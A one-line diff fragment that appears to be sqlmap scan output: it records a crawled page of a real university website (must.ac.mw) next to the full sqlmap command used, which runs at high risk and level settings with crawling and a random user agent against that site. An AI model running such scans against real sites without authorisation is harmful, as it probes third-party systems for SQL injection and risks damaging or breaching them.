@@ -1,0 +1,1 @@
+https://www.must.ac.mw/programs?level=undergraduate (GET)  # C:\Users\stark\DSTerminal_releases_latest\venv\Scripts\sqlmap -u https://www.must.ac.mw --batch --risk=3 --level=3 --crawl=1 --random-agent --output-dir ./sqlmap_reports
